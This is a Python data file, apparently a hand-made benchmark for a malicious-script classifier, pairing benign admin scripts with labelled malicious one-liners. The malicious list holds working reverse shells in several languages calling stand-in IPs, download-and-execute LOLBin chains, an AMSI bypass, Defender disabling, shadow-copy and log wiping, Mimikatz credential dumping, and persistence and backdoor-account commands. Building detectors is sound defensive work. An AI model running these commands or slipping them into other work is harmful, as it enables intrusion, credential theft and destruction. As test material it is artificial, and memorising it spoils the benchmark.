"""Independent benchmark for the script classifier: 60 hand-written scripts that are NEVER used for training.

Why: the model is trained on generated scripts, so its test score on more generated scripts says little (it can be 100% and still
fail on a real script). These scripts were written by hand in many styles, including HARD cases on both sides:
  * harmless scripts that do the same things attackers do (download a vendor installer and run it, add a Run key, schedule a task,
    base64 a logo, use PowerShell hidden because it is a service helper)
  * malicious scripts written in unusual ways (reverse shells in Python / Perl / PHP, AMSI patch, Defender exclusions, LOLBin chains,
    WMI persistence, startup folder drops)
train_ai.py runs it after every training and writes the result to train_info.json. Add your own cases here.
"""

BENIGN = [
    "Get-ChildItem C:\\Logs -Recurse | Where-Object {$_.LastWriteTime -lt (Get-Date).AddDays(-30)} | Remove-Item -Force\nWrite-Output 'cleanup done'",
    "@echo off\nset BACKUP=D:\\backup\nxcopy C:\\Users\\%USERNAME%\\Documents %BACKUP% /E /Y\necho Backup complete",
    "#!/bin/bash\nfor f in /var/log/*.log; do gzip -9 \"$f\"; done\necho rotated logs at $(date)",
    "$s = New-Object -ComObject WScript.Shell\n$l = $s.CreateShortcut(\"$env:USERPROFILE\\Desktop\\App.lnk\")\n$l.TargetPath='C:\\Program Files\\App\\app.exe'\n$l.Save()",
    "Invoke-WebRequest -Uri https://download.visualstudio.microsoft.com/download/pr/vs_community.exe -OutFile $env:TEMP\\vs.exe\nStart-Process $env:TEMP\\vs.exe -ArgumentList '/quiet','/norestart' -Wait",
    "import requests\nr = requests.get('https://api.github.com/repos/python/cpython')\nprint(r.json()['stargazers_count'])",
    "reg add HKCU\\Software\\MyApp /v Theme /t REG_SZ /d dark /f",
    "schtasks /create /tn \"NightlyBackup\" /tr \"C:\\scripts\\backup.bat\" /sc daily /st 02:00",
    "$url = 'https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe'\n$out = \"$env:TEMP\\python-installer.exe\"\n(New-Object System.Net.WebClient).DownloadFile($url, $out)\nStart-Process $out -ArgumentList '/quiet InstallAllUsers=1' -Wait",
    "winget install --id Git.Git -e --source winget\nwinget install --id Microsoft.VisualStudioCode -e",
    "pip install -r requirements.txt\npython manage.py migrate\npython manage.py runserver 0.0.0.0:8000",
    "param([string]$Path)\nGet-FileHash -Algorithm SHA256 -Path $Path | Format-List",
    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, CPU, WorkingSet | Format-Table -AutoSize",
    "#!/usr/bin/env python3\nimport shutil, sys\nshutil.make_archive('backup', 'zip', sys.argv[1])\nprint('created backup.zip')",
    "for /f \"tokens=*\" %%i in ('dir /b *.log') do (\n  move \"%%i\" archive\\\n)\necho moved",
    "$logo = [Convert]::FromBase64String('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')\n[IO.File]::WriteAllBytes('C:\\Temp\\logo.png', $logo)",
    "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyTray' -Value '\"C:\\Program Files\\MyTray\\tray.exe\" --minimized'",
    "powershell.exe -NoProfile -WindowStyle Hidden -File \"C:\\Program Files\\Vendor\\Agent\\collect-inventory.ps1\"",
    "docker compose up -d\ndocker compose logs --tail=50 web",
    "const http = require('http');\nhttp.createServer((req, res) => { res.end('hello'); }).listen(8080);",
    "ssh admin@10.0.0.5 'sudo systemctl restart nginx && systemctl status nginx --no-pager'",
    "sudo apt-get update && sudo apt-get install -y nginx\nsudo systemctl enable nginx",
    "netsh advfirewall firewall add rule name=\"Allow Web\" dir=in action=allow protocol=TCP localport=443",
    "Get-EventLog -LogName Security -Newest 50 | Where-Object {$_.EventID -eq 4625} | Format-Table TimeGenerated, Message",
    "Add-Type -AssemblyName System.IO.Compression.FileSystem\n[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Temp\\data.zip', 'C:\\Temp\\data')",
    "curl -fsSL https://get.docker.com -o get-docker.sh\nsh ./get-docker.sh --dry-run",
    "wget https://nodejs.org/dist/v20.11.0/node-v20.11.0-linux-x64.tar.xz\ntar -xf node-v20.11.0-linux-x64.tar.xz -C /opt",
    "Import-Module ActiveDirectory\nGet-ADUser -Filter {Enabled -eq $false} | Select-Object Name, SamAccountName | Export-Csv disabled.csv",
    "msiexec /i \"C:\\Installers\\7z2301-x64.msi\" /qn /norestart",
    "' Inventory script\nSet objWMI = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\nSet cols = objWMI.ExecQuery(\"Select * from Win32_OperatingSystem\")\nFor Each o In cols: WScript.Echo o.Caption: Next",
]

MALICIOUS = [
    "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('10.1.1.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($o)),0,$o.Length)}\"",
    "Set-MpPreference -DisableRealtimeMonitoring $true\nAdd-MpPreference -ExclusionPath C:\\Users\\Public\nnetsh advfirewall set allprofiles state off",
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"powershell -w hidden -file C:\\Users\\Public\\u.ps1\" /f\nschtasks /create /sc onlogon /tn Updater /tr C:\\Users\\Public\\u.exe",
    "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1",
    "$u='http://198.51.100.7/p.txt';$d=(New-Object System.Net.WebClient).DownloadString($u);Invoke-Expression $d",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.9\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    "perl -e 'use Socket;$i=\"203.0.113.9\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "php -r '$sock=fsockopen(\"203.0.113.9\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.0.113.9 4444 > /tmp/f",
    "certutil -urlcache -split -f http://198.51.100.7/a.exe %TEMP%\\a.exe && start %TEMP%\\a.exe",
    "bitsadmin /transfer j /download /priority high http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe & C:\\Users\\Public\\a.exe",
    "mshta http://198.51.100.7/x.hta",
    "regsvr32 /s /n /u /i:http://198.51.100.7/x.sct scrobj.dll",
    "powershell -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhACcAKQA=",
    "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"f\", EventNamespace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\npowershell -w hidden -c iex(iwr http://198.51.100.7/a)",
    "copy C:\\Users\\Public\\u.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe\"\nattrib +h +s \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe\"",
    "vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\nbcdedit /set {default} recoveryenabled no\nwevtutil cl System",
    "(crontab -l 2>/dev/null; echo \"* * * * * curl -s http://198.51.100.7/a.sh | sh\") | crontab -",
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 attacker@host' >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\nsystemctl stop auditd; history -c",
    "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
    "$a='I'+'E'+'X'; & $a (New-Object Net.WebClient).('Down'+'loadString')('http://198.51.100.7/a')",
    "var sh = new ActiveXObject('WScript.Shell'); var x = new ActiveXObject('MSXML2.XMLHTTP'); x.open('GET','http://198.51.100.7/a.exe',false); x.send(); sh.Run('cmd /c ' + x.responseText, 0);",
    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -w hidden -c iex(iwr http://198.51.100.7/a)\",0)",
    "wget -q http://198.51.100.7/x -O /tmp/.x && chmod +x /tmp/.x && nohup /tmp/.x >/dev/null 2>&1 &\nrm -f ~/.bash_history",
    "sc stop WinDefend\nsc config WinDefend start= disabled\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
    "import base64,os\nexec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzIwMy4wLjExMy45Jyw0NDQ0KSk7c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCcsJy1pJ10pOw=='))",
    "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAAAL1UXW/aQBB9z6/YR9gKYgM4TaQ+JCGFpC4IqrTkAVXRZbjYB2efdXcOKyj/vWtDgKRKH6pKlmV7Z2bn3c6btW7XDRdQqcVQ'))\nIEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
    "cmd /c start /min powershell -w hidden -ep bypass -c \"iwr http://198.51.100.7/s.ps1 -UseBasicParsing | iex\"",
    "schtasks /create /tn \"Windows Update Check\" /tr \"powershell -w hidden -ep bypass -file C:\\ProgramData\\wu.ps1\" /sc minute /mo 5 /ru SYSTEM /f",
    "net user support P@ssw0rd123 /add\nnet localgroup administrators support /add\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
]

ALL = [("benign", t) for t in BENIGN] + [("malicious", t) for t in MALICIOUS]
